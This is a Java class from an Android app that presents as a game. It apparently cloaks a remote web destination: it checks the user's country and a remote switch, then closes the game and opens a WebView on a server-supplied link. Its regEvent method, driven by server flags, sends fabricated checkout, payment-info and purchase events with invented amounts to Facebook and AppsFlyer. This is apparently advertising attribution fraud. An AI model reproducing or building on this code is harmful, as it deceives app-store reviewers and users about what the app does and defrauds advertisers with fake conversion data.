package com.crossand.zero;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.appsflyer.AFInAppEventType;
import com.appsflyer.AppsFlyerLib;
import com.appsflyer.attribution.AppsFlyerRequestListener;
import com.facebook.appevents.AppEventsConstants;
import com.facebook.appevents.AppEventsLogger;

import org.json.JSONException;

import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import androidx.annotation.NonNull;

import static com.facebook.FacebookSdk.getApplicationContext;
import static java.lang.Thread.sleep;

public class Connections {

    private String gitUrl = "";
    private final Context context;
    private final SharedPreferences myPreferences;
    private final MainActivity activity;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private String hash = "";
    private boolean isNotStopCycle = true;
    private final SharedPreferences.Editor myEditor;
    private String deep;
    private String geo;


    public Connections(Context context, SharedPreferences myPreferences, MainActivity activity, SharedPreferences.Editor myEditor, String deep) {
        this.context = context;
        this.myPreferences = myPreferences;
        this.activity = activity;
        this.myEditor = myEditor;
        this.deep = deep;
    }

    public void regEvent() {
        char[] chars = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        StringBuilder sb = new StringBuilder(21);
        Random random = new Random();
        for (int i = 0; i < 21; i++) {
            char c = chars[random.nextInt(chars.length)];

            sb.append(c);
        }
        hash = myPreferences.getString("Hash", sb.toString());
        myEditor.putString("Hash", hash);
        myEditor.apply();
        String eventUrl = Configuration.SERV.getData() + "app_id=" + context.getPackageName() + "&hash=" + hash + "&sender=android_request";
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest
                (com.android.volley.Request.Method.GET, eventUrl, null,
                        response -> {
                            try {
                                AppEventsLogger logger = AppEventsLogger.newLogger(context);
                                if (response.get("reg").toString().equals("1")) {
                                    if (myPreferences.getBoolean("reg", true)) {
                                        sendAppsflyeraddInfo();
                                        myEditor.putBoolean("reg", false);
                                        myEditor.apply();
                                        Bundle params = new Bundle();
                                        params.putString(AppEventsConstants.EVENT_PARAM_CURRENCY, "USD");
                                        params.putString(AppEventsConstants.EVENT_PARAM_CONTENT, "id : 1234");
                                        logger.logEvent(AppEventsConstants.EVENT_NAME_INITIATED_CHECKOUT,
                                                54.23,
                                                params);
                                    }
                                }
                                if (response.get("dep").toString().equals("1")) {
                                    if (myPreferences.getBoolean("dep", true)) {
                                        sendAppsflyeraddPurs();
                                        myEditor.putBoolean("dep", false);
                                        myEditor.apply();
                                        Bundle params = new Bundle();
                                        params.putString(AppEventsConstants.EVENT_PARAM_CURRENCY, "Dollars");
                                        params.putString(AppEventsConstants.EVENT_PARAM_CONTENT_TYPE, "AppPurch");
                                        params.putString(AppEventsConstants.EVENT_PARAM_CONTENT, "869215");
                                        logger.logEvent(AppEventsConstants.EVENT_NAME_ADDED_PAYMENT_INFO,
                                                54.23,
                                                params);
                                    }
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }, error -> Log.e("", error.toString()));
        executor.execute(() -> {
            while (isNotStopCycle) {
                try {
                    //noinspection BusyWait
                    sleep(700);
                    Connector.getInstance(context).addToRequestQueue(jsonObjectRequest);
                    if (!myPreferences.getBoolean("reg", true) && !myPreferences.getBoolean("dep", true)) {
                        isNotStopCycle = false;
                        break;
                    }
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    private void sendAppsflyeraddPurs() {
        AppsFlyerLib.getInstance().setDebugLog(true);
        Map<String, Object> buys = new HashMap<>();
        AppsFlyerLib.getInstance().logEvent(getApplicationContext(), AFInAppEventType.PURCHASE, buys, new AppsFlyerRequestListener() {
            @Override
            public void onSuccess() {
            }

            @Override
            public void onError(int i, @NonNull String s) {
            }
        });
    }

    private void sendAppsflyeraddInfo() {
        AppsFlyerLib.getInstance().setDebugLog(true);
        Map<String, Object> addInfo = new HashMap<>();
        AppsFlyerLib.getInstance().logEvent(getApplicationContext(), AFInAppEventType.ADD_PAYMENT_INFO, addInfo, new AppsFlyerRequestListener() {
            @Override
            public void onSuccess() {
            }

            @Override
            public void onError(int i, @NonNull String s) {
            }
        });
    }

    public void getGeo() {
        if (myPreferences.getBoolean("states", false)) {
            JsonObjectRequest jsonObjectRequest = new JsonObjectRequest
                    (com.android.volley.Request.Method.GET, Configuration.STRING.getData(), null,
                            response -> {
                                try {
                                    gitUrl = response.get("Links").toString();
                                    glueDeepLink(deep);
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }, error -> Log.e("error git ", error.toString()));
            Connector.getInstance(context).addToRequestQueue(jsonObjectRequest);
        } else {
            JsonObjectRequest jsonObjectRequestLoc = new JsonObjectRequest
                    (com.android.volley.Request.Method.GET, "http://www.geoplugin.net/json.gp?ip={$ip}", null,
                            response -> {
                                try {
                                    geo = response.get("geoplugin_countryCode").toString();
                                    startVebCommunication();
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }, error -> Log.e("error git ", error.toString()));
            Connector.getInstance(context).addToRequestQueue(jsonObjectRequestLoc);
        }
    }

    private void startVebCommunication() {
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest
                (com.android.volley.Request.Method.GET, Configuration.STRING.getData(), null,
                        response -> {
                            try {
                                if ((response.get("Active").toString().equals("true")
                                        && response.get("countries").toString().toUpperCase().contains(geo))
                                        | (response.get("Active").toString().equals("true")
                                        && response.get("countries").toString().toUpperCase().equals("ALL"))) {
                                    saveWebState();
                                    gitUrl = response.get("Links").toString();
                                    glueDeepLink(deep);
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }, error -> Log.e(" ", error.toString()));
        Connector.getInstance(context).addToRequestQueue(jsonObjectRequest);
    }

    private void saveWebState() {
        myEditor.putBoolean("states", true);
        myEditor.apply();
    }

    private void glueDeepLink(String deepLink) {
        regEvent();
        MainActivity.isGame = false;
        if (MainUserGameActivity.act != null) {
            MainUserGameActivity.act.finish();
        }
        deep = myPreferences.getString("Link", deepLink);
        if (gitUrl.contains("?")) {
            gitUrl += "&" + deepLink + "&hash=" + hash + "&app_id=" + context.getPackageName();
        } else {
            gitUrl += "?" + deepLink + "&hash=" + hash + "&app_id=" + context.getPackageName();
        }
        Intent intent = new Intent(context, WebViewActivity.class);
        intent.putExtra("Links", gitUrl);
        myEditor.putString("Link", deep);
        myEditor.apply();
        context.startActivity(intent);
        activity.finish();
    }

    private static class Connector {
        @SuppressLint("StaticFieldLeak")
        private static Connector instance;
        private RequestQueue requestQueue;
        @SuppressLint("StaticFieldLeak")
        private static Context ctx;

        private Connector(Context context) {
            ctx = context;
            requestQueue = getRequestQueue();

        }

        static synchronized Connector getInstance(Context context) {
            if (instance == null) {
                instance = new Connector(context);
            }
            return instance;
        }

        private RequestQueue getRequestQueue() {
            if (requestQueue == null) {
                requestQueue = Volley.newRequestQueue(ctx.getApplicationContext());
            }
            return requestQueue;
        }

        <T> void addToRequestQueue(Request<T> req) {
            getRequestQueue().add(req);
        }

    }
}
